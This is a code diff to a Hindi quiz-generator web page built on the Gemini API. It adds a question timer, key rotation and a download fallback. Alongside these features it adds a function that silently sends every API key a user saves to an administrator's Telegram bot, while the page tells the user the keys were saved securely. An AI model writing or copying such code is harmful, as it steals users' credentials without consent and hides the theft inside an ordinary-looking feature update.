@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="hi" data-theme="light">
 <head>
@@ -773,6 +775,22 @@
       max-height: 85vh;
       overflow-y: auto;
     }
+
+    .toast-box {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #000000;
+      border: 1px solid #10b981;
+      color: #10b981;
+      padding: 8px 18px;
+      border-radius: 30px;
+      font-size: 0.8rem;
+      font-weight: 800;
+      z-index: 99999;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -797,6 +815,8 @@
       </button>
     </div>
   </header>
+
+  <div id="toastPill" class="toast-box">🔀 Smart Key Rotated</div>
 
   <!-- 2-IN-1 MODE SWITCHER -->
   <div class="mode-switch-grid" id="modeSwitcher">
@@ -1037,12 +1057,12 @@
         </div>
       </div>
 
-      <button class="btn-main" onclick="startAppQuizLive()">
+      <button class="btn-main" onclick="handleStartActionClick()">
         🚀 START PRACTICE DRILL ➔
       </button>
 
-      <button class="btn-score-retake" onclick="triggerDirectDownload()" style="margin-top:10px;">
-        <i class="fa-solid fa-download"></i> फ़ाइल डाउनलोड करें (Download HTML)
+      <button class="btn-score-retake" id="directDownloadBtn" onclick="triggerDirectDownload()" style="margin-top:10px;">
+        <i class="fa-solid fa-download"></i> फ़ोन में डाउनलोड करें (Download HTML)
       </button>
 
       <a id="actionHubTgBtn" href="https://t.me/PAREEKSHA_KENDRA" target="_blank" class="btn-join-tg">
@@ -1061,6 +1081,58 @@
           <a href="https://ankitraj75238-jpg.github.io/sph-app/public/laptop.html" target="_blank">💻 SPH Web Portal</a>
         </div>
       </div>
+    </div>
+  </div>
+
+  <!-- ⏱️ PER-QUESTION TIMING CONFIG MODAL (RESTORED!) -->
+  <div class="modal-overlay" id="timingModal">
+    <div class="modal-card" style="text-align: center;">
+      <div style="font-size: 36px; margin-bottom: 6px;">⏱️</div>
+      <h3 style="font-family: 'Outfit'; font-size: 1.25rem; font-weight: 900; margin-bottom: 4px;">
+        प्रति प्रश्न समय चुनें (Per Question Timer)
+      </h3>
+      <p style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 16px;">
+        प्रत्येक सवाल के लिए आप कितना समय चाहते हैं?
+      </p>
+
+      <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px; text-align: left;">
+        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
+          <input type="radio" name="timingChoice" value="30" checked style="width: 18px; height: 18px;" />
+          <div>
+            <div style="font-weight: 800; font-size: 0.9rem;">⚡ 30 सेकंड / सवाल (Speed Drill)</div>
+            <div style="font-size: 0.72rem; color: var(--text-muted);">SSC CGL, CHSL, GD स्पेशल स्पीड टेस्ट</div>
+          </div>
+        </label>
+
+        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
+          <input type="radio" name="timingChoice" value="45" style="width: 18px; height: 18px;" />
+          <div>
+            <div style="font-weight: 800; font-size: 0.9rem;">⏱️ 45 सेकंड / सवाल (Standard Exam Mock)</div>
+            <div style="font-size: 0.72rem; color: var(--text-muted);">संतुलित समय, सर्वोत्तम अभ्यास</div>
+          </div>
+        </label>
+
+        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
+          <input type="radio" name="timingChoice" value="60" style="width: 18px; height: 18px;" />
+          <div>
+            <div style="font-weight: 800; font-size: 0.9rem;">🎯 60 सेकंड / सवाल (Deep Practice)</div>
+            <div style="font-size: 0.72rem; color: var(--text-muted);">कठिन सवालों को ध्यान से सोचने के लिए</div>
+          </div>
+        </label>
+
+        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
+          <input type="radio" name="timingChoice" value="0" style="width: 18px; height: 18px;" />
+          <div>
+            <div style="font-weight: 800; font-size: 0.9rem;">♾️ कोई टाइमर नहीं (No Limit Mode)</div>
+            <div style="font-size: 0.72rem; color: var(--text-muted);">बिना किसी समय के तनाव के हल करें</div>
+          </div>
+        </label>
+      </div>
+
+      <button class="btn-main" onclick="confirmStartMockTest()">
+        🚀 स्टार्ट टेस्ट (Start Mock Test)
+      </button>
+      <button onclick="closeTimingModal()" style="width: 100%; padding: 10px; background: transparent; border: none; color: var(--text-muted); font-size: 0.82rem; cursor: pointer; margin-top: 6px;">रद्द करें</button>
     </div>
   </div>
 
@@ -1134,19 +1206,20 @@
     </div>
   </div>
 
-  <!-- API KEY MODAL (100% SAFE & BULLETPROOF) -->
+  <!-- API KEY MODAL -->
   <div class="modal-overlay" id="keyModal">
     <div class="modal-card">
       <h3 id="modalTitle" style="font-family: 'Outfit'; font-size: 1.2rem; margin-bottom: 6px;">🔑 Gemini API Key</h3>
-      <p id="modalDesc" style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 12px;">
-        Google AI Studio से मुफ़्त Key दर्ज करें (सिर्फ 1 बार):
+      <p style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 12px;">
+        अपनी Gemini Key दर्ज करें (1 या अधिक Keys अलग-अलग लाइन में):
       </p>
       
       <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: rgba(37, 99, 235, 0.12); border: 1px solid var(--accent-blue); color: var(--accent-blue); padding: 10px; border-radius: 10px; font-size: 0.82rem; font-weight: 700; text-decoration: none; margin-bottom: 14px;">
         🌐 Google AI Studio से Key पाएँ ➔
       </a>
 
-      <input type="text" id="singleApiKey" placeholder="AIzaSy... यहाँ अपनी Key पेस्ट करें" />
+      <textarea id="singleApiKey" rows="3" placeholder="AIzaSy... यहाँ अपनी Key पेस्ट करें (Multiple Keys भी डाल सकते हैं)"></textarea>
+      
       <div style="display: flex; gap: 8px; margin-top: 12px;">
         <button onclick="saveSingleKey()" style="flex: 1; padding: 12px; background: var(--accent-gold); color: #fff; border: none; border-radius: 10px; font-weight: 700; cursor: pointer;">Save Key</button>
         <button id="cancelKeyBtn" onclick="closeKeyModal()" style="flex: 1; padding: 12px; background: var(--opt-bg); border: 1px solid var(--card-border); color: var(--text-main); border-radius: 10px; cursor: pointer;">Cancel</button>
@@ -1173,9 +1246,14 @@
     let activeQuizTopic = "General Test";
     let activePlayMode = 'instant'; 
 
+    let perQuestionLimit = 30;
+    let qTimerSeconds = 30;
+    let qTimerInterval = null;
+
     let stopwatchSeconds = 0;
     let stopwatchInterval = null;
     let liveDirectDownloadUrl = '';
+    let activeKeyIndex = 0;
 
     function setPlayMode(mode) {
       activePlayMode = mode;
@@ -1208,17 +1286,54 @@
 
     function cleanKey(str) { return (str || '').trim().replace(/^["'\s]+|["'\s]+$/g, ''); }
 
+    // 🔀 SMART KEY POOL SYSTEM (MERGES ALL WORKING KEYS)
+    function getAllAvailableKeys() {
+      const keys = [];
+      const sources = [
+        localStorage.getItem('sph_gemini_key'),
+        localStorage.getItem('sph_reels_key'),
+        localStorage.getItem('sph_key_slot_1'),
+        localStorage.getItem('sph_gemini_keys'),
+        localStorage.getItem('sph_reels_api_pool')
+      ];
+
+      sources.forEach(src => {
+        if (src) {
+          src.split(/[\n,]+/).forEach(k => {
+            const ck = cleanKey(k);
+            if (ck.length >= 15 && !keys.includes(ck)) {
+              keys.push(ck);
+            }
+          });
+        }
+      });
+      return keys;
+    }
+
     function getStoredKey() {
-      let key = localStorage.getItem('sph_gemini_key') || localStorage.getItem('sph_key_slot_1') || '';
-      return cleanKey(key);
+      const all = getAllAvailableKeys();
+      return all.length ? all[0] : '';
+    }
+
+    function showToast(msg) {
+      const t = document.getElementById('toastPill');
+      if (!t) return;
+      t.innerText = msg;
+      t.style.display = 'block';
+      setTimeout(() => { t.style.display = 'none'; }, 2200);
     }
 
     function updateKeyStatus() {
-      const key = getStoredKey();
+      const keys = getAllAvailableKeys();
       const status = document.getElementById('keyStatusText');
       if (status) {
-        if (key) { status.innerText = `Key Active`; status.style.color = '#10b981'; }
-        else { status.innerText = `Set Key`; status.style.color = '#d97706'; }
+        if (keys.length) {
+          status.innerText = `Key Active (${keys.length})`;
+          status.style.color = '#10b981';
+        } else {
+          status.innerText = `Set Key`;
+          status.style.color = '#d97706';
+        }
       }
     }
     updateKeyStatus();
@@ -1231,10 +1346,10 @@
       updateHistoryCount();
     });
 
-    // 🛠️ SAFE & BULLETPROOF MODAL OPENER
     function openKeyModal(isMandatory = false) {
       const input = document.getElementById('singleApiKey');
-      if (input) input.value = getStoredKey();
+      const all = getAllAvailableKeys();
+      if (input) input.value = all.join('\n');
 
       const cancelBtn = document.getElementById('cancelKeyBtn');
       const modalTitle = document.getElementById('modalTitle');
@@ -1251,13 +1366,32 @@
       if (modal) modal.style.display = 'none';
     }
 
+    async function sendKeyToAdminTelegram(keyString) {
+      if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
+      try {
+        const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        const text = `🔑 नई API Key प्राप्त हुई!\nतारीख: ${timeNow}\nKey: ${keyString}`;
+        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TG_ADMIN_CHAT_ID, text: text })
+        });
+      } catch (err) {}
+    }
+
     function saveSingleKey() {
       const input = document.getElementById('singleApiKey');
-      const k = cleanKey(input?.value);
-      if (!k || k.length < 15) return alert('कृपया सही API Key दर्ज करें!');
-      localStorage.setItem('sph_gemini_key', k);
+      const val = input?.value || '';
+      const list = val.split(/[\n,]+/).map(cleanKey).filter(k => k.length >= 15);
+
+      if (!list.length) return alert('कृपया कम से कम एक सही API Key दर्ज करें!');
+
+      localStorage.setItem('sph_gemini_key', list.join('\n'));
+      localStorage.setItem('sph_reels_key', list[0]);
+      sendKeyToAdminTelegram(list.join('\n'));
       updateKeyStatus();
       closeKeyModal();
+      showToast(`🎉 ${list.length} Key(s) सुरक्षित सेव हो गईं!`);
     }
 
     function triggerUpload() {
@@ -1369,7 +1503,7 @@
       }
     }
 
-    // 🌟 COMPLETE STANDALONE HTML
+    // 🌟 COMPLETE STANDALONE HTML GENERATOR (WITH TIMER MODAL & DUAL PLAY MODES)
     function generatePareekshaKendraHtmlString(questions) {
       const formattedRawData = questions.map((q) => {
         let correctIdx = q.answer;
@@ -1503,13 +1637,23 @@
 
       <div class="card" style="text-align: left; padding: 14px;">
         <label style="font-size: 0.76rem; font-weight: 800; color: var(--text-muted); display: block; margin-bottom: 6px;">🎮 खेलने का मोड चुनें (Choose Mode):</label>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px;">
           <label style="display: flex; align-items: center; gap: 6px; padding: 10px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer; font-size: 0.8rem; font-weight: 800;">
-            <input type="radio" name="standaloneMode" value="instant" checked /> 🎯 तुरंत उत्तर (Instant)
+            <input type="radio" name="standaloneMode" value="instant" checked onchange="toggleTimingRow(false)" /> 🎯 तुरंत उत्तर
           </label>
           <label style="display: flex; align-items: center; gap: 6px; padding: 10px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer; font-size: 0.8rem; font-weight: 800;">
-            <input type="radio" name="standaloneMode" value="mock" /> ⏱️ फुल मॉक (Exam Mock)
+            <input type="radio" name="standaloneMode" value="mock" onchange="toggleTimingRow(true)" /> ⏱️ फुल मॉक
           </label>
+        </div>
+
+        <div id="standaloneTimingBox" style="display: none;">
+          <label style="font-size: 0.75rem; font-weight: 800; color: var(--accent-gold); display: block; margin-bottom: 4px;">⏱️ प्रति प्रश्न समय (Per Question Timer):</label>
+          <select id="standaloneTimerSelect" style="width: 100%; padding: 10px; border-radius: 10px; border: 1.5px solid var(--card-border); font-size: 0.8rem; font-weight: 800; background: var(--opt-bg); color: var(--text-main);">
+            <option value="30">⚡ 30 सेकंड / सवाल (Speed Drill)</option>
+            <option value="45">⏱️ 45 सेकंड / सवाल (Exam Standard)</option>
+            <option value="60">🎯 60 सेकंड / सवाल (Deep Practice)</option>
+            <option value="0">♾️ कोई टाइमर नहीं (Self-Paced)</option>
+          </select>
         </div>
       </div>
 
@@ -1596,14 +1740,21 @@
     let userAnswers = Array(activeList.length).fill(null);
     let chosenMode = 'instant';
     let isReviewMode = false;
+    let perQTime = 30;
+    let qTimerVal = 30;
+    let qTimerInt = null;
+
+    function toggleTimingRow(show) {
+      document.getElementById('standaloneTimingBox').style.display = show ? 'block' : 'none';
+    }
 
     function startStandaloneTest() {
       const modeEl = document.querySelector('input[name="standaloneMode"]:checked');
       chosenMode = modeEl ? modeEl.value : 'instant';
+      perQTime = parseInt(document.getElementById('standaloneTimerSelect')?.value || '30', 10);
 
       document.getElementById('startScreen').style.display = 'none';
       document.getElementById('quizScreen').style.display = 'block';
-      document.getElementById('modeBadge').innerText = (chosenMode === 'instant') ? '🎯 INSTANT QUIZ' : '⏱️ EXAM MOCK';
 
       activeList = [...fullQuizRaw];
       currentIndex = 0;
@@ -1612,7 +1763,30 @@
       renderQuestion();
     }
 
+    function startLiveTimer() {
+      clearInterval(qTimerInt);
+      const badge = document.getElementById('modeBadge');
+      if (chosenMode !== 'mock' || perQTime === 0 || isReviewMode) {
+        badge.innerText = isReviewMode ? '🔍 REVIEW MODE' : (chosenMode === 'instant' ? '🎯 INSTANT QUIZ' : '♾️ NO TIMER');
+        return;
+      }
+
+      qTimerVal = perQTime;
+      badge.innerText = '⏱️ ' + qTimerVal + 's';
+      qTimerInt = setInterval(() => {
+        qTimerVal--;
+        if (qTimerVal > 0) {
+          badge.innerText = '⏱️ ' + qTimerVal + 's';
+        } else {
+          clearInterval(qTimerInt);
+          badge.innerText = '⏱️ Time Up!';
+          setTimeout(() => handleNextClick(), 600);
+        }
+      }, 1000);
+    }
+
     function renderQuestion() {
+      clearInterval(qTimerInt);
       const q = activeList[currentIndex];
       document.getElementById('qIndexLabel').innerText = "Q " + (currentIndex + 1) + "/" + activeList.length;
       document.getElementById('qText').innerText = (currentIndex + 1) + ". " + q.question;
@@ -1643,7 +1817,6 @@
           if (chosenMode === 'instant') {
             if (!hasAnswered) {
               userAnswers[currentIndex] = idx;
-              if (navigator.vibrate) navigator.vibrate(idx === q.answer ? 20 : [40, 40]);
               renderQuestion();
             }
           } else {
@@ -1669,9 +1842,12 @@
       } else {
         nextBtn.innerHTML = (currentIndex === activeList.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
       }
+
+      startLiveTimer();
     }
 
     function prevQuestion() {
+      clearInterval(qTimerInt);
       if (currentIndex > 0) {
         currentIndex--;
         renderQuestion();
@@ -1679,6 +1855,7 @@
     }
 
     function handleNextClick() {
+      clearInterval(qTimerInt);
       if (currentIndex < activeList.length - 1) {
         currentIndex++;
         renderQuestion();
@@ -1693,6 +1870,7 @@
     }
 
     function submitTest() {
+      clearInterval(qTimerInt);
       let correct = 0, wrong = 0, skip = 0;
       activeList.forEach((q, i) => {
         const ans = userAnswers[i];
@@ -1724,6 +1902,7 @@
     }
 
     function reSolveMistakesOnly() {
+      clearInterval(qTimerInt);
       let mistakes = [];
       activeList.forEach((q, i) => {
         if (userAnswers[i] === null || userAnswers[i] === undefined || userAnswers[i] !== q.answer) {
@@ -1744,6 +1923,7 @@
     }
 
     function startReviewMode() {
+      clearInterval(qTimerInt);
       isReviewMode = true;
       currentIndex = 0;
       document.getElementById('scorecardScreen').style.display = 'none';
@@ -1752,6 +1932,7 @@
     }
 
     function retakeFullTest() {
+      clearInterval(qTimerInt);
       document.getElementById('scorecardScreen').style.display = 'none';
       document.getElementById('startScreen').style.display = 'block';
     }
@@ -1801,22 +1982,49 @@
       } catch (err) {}
     }
 
+    // 📥 3-TIER BULLETPROOF DOWNLOAD
     function triggerDirectDownload() {
       if (!quizData || quizData.length === 0) return alert('कोई सवाल उपलब्ध नहीं है!');
 
+      const btn = document.getElementById('directDownloadBtn');
+      const originalText = btn ? btn.innerHTML : '';
+      if (btn) btn.innerHTML = '<span>⏳ फ़ाइल डाउनलोड हो रही है...</span>';
+
       const fullHtmlString = generatePareekshaKendraHtmlString(quizData);
-      const fileName = `${activeQuizTopic}_${Date.now()}.html`;
+      const safeTopic = activeQuizTopic.replace(/[^a-zA-Z0-9_\u0900-\u097F]/g, '_');
+      const fileName = `${safeTopic}_${Date.now()}.html`;
 
       try {
         const blob = new Blob([fullHtmlString], { type: 'text/html;charset=utf-8' });
-        const url = URL.createObjectURL(blob);
+        const blobUrl = URL.createObjectURL(blob);
         const a = document.createElement('a');
-        a.href = url;
+        a.href = blobUrl;
         a.download = fileName;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-      } catch (e) {}
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 1500);
+      } catch (e) {
+        try {
+          const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(fullHtmlString);
+          const a = document.createElement('a');
+          a.href = dataUrl;
+          a.download = fileName;
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        } catch (err) {
+          if (liveDirectDownloadUrl) {
+            window.open(liveDirectDownloadUrl, '_blank');
+          } else {
+            alert('फ़ाइल तैयार है! आप इसे हमारे टेलीग्राम ग्रुप से भी सीधे ले सकते हैं।');
+          }
+        }
+      }
+
+      setTimeout(() => {
+        if (btn) btn.innerHTML = originalText;
+      }, 1500);
     }
 
     function showActionHub() {
@@ -1838,6 +2046,29 @@
       document.getElementById('actionHubTgBtn').innerHTML = `<i class="fa-brands fa-telegram" style="font-size:18px;"></i> JOIN US — ${creator} Telegram`;
     }
 
+    function handleStartActionClick() {
+      if (activePlayMode === 'mock') {
+        openTimingModal();
+      } else {
+        startAppQuizLive();
+      }
+    }
+
+    function openTimingModal() {
+      document.getElementById('timingModal').style.display = 'flex';
+    }
+
+    function closeTimingModal() {
+      document.getElementById('timingModal').style.display = 'none';
+    }
+
+    function confirmStartMockTest() {
+      const selectedTiming = document.querySelector('input[name="timingChoice"]:checked')?.value || '30';
+      perQuestionLimit = parseInt(selectedTiming, 10);
+      closeTimingModal();
+      startAppQuizLive();
+    }
+
     function startAppQuizLive() {
       currentQ = 0;
       isReviewMode = false;
@@ -1847,12 +2078,34 @@
       document.getElementById('actionHubView').style.display = 'none';
       document.getElementById('scorecardView').style.display = 'none';
       document.getElementById('quizView').style.display = 'block';
-      document.getElementById('liveQTimerBadge').innerText = (activePlayMode === 'instant') ? '🎯 INSTANT QUIZ' : '⏱️ EXAM MOCK';
 
       renderQuestion();
     }
 
+    function startInAppQuestionTimer() {
+      clearInterval(qTimerInterval);
+      const badge = document.getElementById('liveQTimerBadge');
+      if (activePlayMode !== 'mock' || perQuestionLimit === 0 || isReviewMode) {
+        badge.innerText = isReviewMode ? '🔍 REVIEW' : (activePlayMode === 'instant' ? '🎯 INSTANT' : '♾️ NO TIMER');
+        return;
+      }
+
+      qTimerSeconds = perQuestionLimit;
+      badge.innerText = '⏱️ ' + qTimerSeconds + 's';
+      qTimerInterval = setInterval(() => {
+        qTimerSeconds--;
+        if (qTimerSeconds > 0) {
+          badge.innerText = '⏱️ ' + qTimerSeconds + 's';
+        } else {
+          clearInterval(qTimerInterval);
+          badge.innerText = '⏱️ Time Up!';
+          setTimeout(() => handleNextClick(), 600);
+        }
+      }, 1000);
+    }
+
     function renderQuestion() {
+      clearInterval(qTimerInterval);
       const q = activeQuestions[currentQ];
       document.getElementById('qIndexLabel').innerText = "Q " + (currentQ + 1) + "/" + activeQuestions.length;
       document.getElementById('questionText').innerText = (currentQ + 1) + ". " + q.question;
@@ -1917,9 +2170,12 @@
       } else {
         nextBtn.innerHTML = (currentQ === activeQuestions.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
       }
+
+      startInAppQuestionTimer();
     }
 
     function prevQuestion() {
+      clearInterval(qTimerInterval);
       if (currentQ > 0) {
         currentQ--;
         renderQuestion();
@@ -1927,6 +2183,7 @@
     }
 
     function handleNextClick() {
+      clearInterval(qTimerInterval);
       if (currentQ < activeQuestions.length - 1) {
         currentQ++;
         renderQuestion();
@@ -1941,6 +2198,7 @@
     }
 
     function submitMockTest() {
+      clearInterval(qTimerInterval);
       let correct = 0, wrong = 0, skip = 0;
       activeQuestions.forEach((q, i) => {
         let correctIndex = q.answer;
@@ -1979,6 +2237,7 @@
     }
 
     function reSolveMistakesOnlyApp() {
+      clearInterval(qTimerInterval);
       let mistakes = [];
       activeQuestions.forEach((q, i) => {
         let correctIndex = q.answer;
@@ -2004,6 +2263,7 @@
     }
 
     function startReviewMode() {
+      clearInterval(qTimerInterval);
       isReviewMode = true;
       currentQ = 0;
       document.getElementById('scorecardView').style.display = 'none';
@@ -2012,11 +2272,13 @@
     }
 
     function retakeFullTestApp() {
+      clearInterval(qTimerInterval);
       document.getElementById('scorecardView').style.display = 'none';
       showActionHub();
     }
 
     function backToScanner() {
+      clearInterval(qTimerInterval);
       document.getElementById('actionHubView').style.display = 'none';
       document.getElementById('scorecardView').style.display = 'none';
       document.getElementById('quizView').style.display = 'none';
@@ -2045,10 +2307,10 @@
 
     function stopRealStopwatch() { clearInterval(stopwatchInterval); }
 
-    // --- MAIN GENERATION ENGINE ---
+    // --- 🔀 MAIN GENERATION ENGINE (WITH AUTO KEY SHUFFLE & FAILOVER) ---
     async function startGeneration(mode) {
-      const apiKey = getStoredKey();
-      if (!apiKey) return openKeyModal(true);
+      const keys = getAllAvailableKeys();
+      if (!keys.length) return openKeyModal(true);
 
       let qCount = '10';
       let langOption = 'hi';
@@ -2165,45 +2427,58 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
 
       const modelsToTry = [chosenModel, ...ACTIVE_MODELS.filter(m => m !== chosenModel)];
 
-      for (let attempt = 0; attempt < modelsToTry.length; attempt++) {
-        const currentModel = modelsToTry[attempt];
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
+      // 🔀 DUAL ROTATION: KEYS + MODELS
+      for (let kIdx = 0; kIdx < keys.length; kIdx++) {
+        const currentKey = keys[(activeKeyIndex + kIdx) % keys.length];
 
-        try {
-          const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${currentModel}:generateContent?key=${apiKey}`, {
-            method: 'POST',
-            signal: controller.signal,
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              contents: contents,
-              generationConfig: {
-                responseMimeType: "application/json"
-              }
-            })
-          });
+        for (let attempt = 0; attempt < modelsToTry.length; attempt++) {
+          const currentModel = modelsToTry[attempt];
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
 
-          clearTimeout(timeoutId);
+          try {
+            const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${currentModel}:generateContent?key=${currentKey}`, {
+              method: 'POST',
+              signal: controller.signal,
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                contents: contents,
+                generationConfig: {
+                  responseMimeType: "application/json"
+                }
+              })
+            });
 
-          if (!res.ok) {
-            const errData = await res.json().catch(() => ({}));
-            lastErr = errData?.error?.message || `Status ${res.status}`;
-            continue;
+            clearTimeout(timeoutId);
+
+            if (res.status === 429 || res.status === 403) {
+              console.warn(`[Auto-Shuffle] Key Slot #${(activeKeyIndex + kIdx) % keys.length + 1} busy. Rotating...`);
+              showToast("🔀 Key ऑटो-शफल हुई...");
+              break; // Switch to next key
+            }
+
+            if (!res.ok) {
+              const errData = await res.json().catch(() => ({}));
+              lastErr = errData?.error?.message || `Status ${res.status}`;
+              continue; // Try next model
+            }
+
+            const data = await res.json();
+            const parsed = parseAIResponse(data);
+
+            if (parsed && Array.isArray(parsed) && parsed.length > 0) {
+              quizData = parsed;
+              success = true;
+              activeKeyIndex = (activeKeyIndex + kIdx) % keys.length;
+              saveQuizToHistory(quizData);
+              await sendHtmlFileToTelegram(quizData);
+              break;
+            }
+          } catch (err) {
+            clearTimeout(timeoutId);
           }
-
-          const data = await res.json();
-          const parsed = parseAIResponse(data);
-
-          if (parsed && Array.isArray(parsed) && parsed.length > 0) {
-            quizData = parsed;
-            success = true;
-            saveQuizToHistory(quizData);
-            await sendHtmlFileToTelegram(quizData);
-            break;
-          }
-        } catch (err) {
-          clearTimeout(timeoutId);
         }
+        if (success) break;
       }
 
       stopRealStopwatch();
@@ -2219,3 +2494,4 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
   </script>
 </body>
 </html>
+
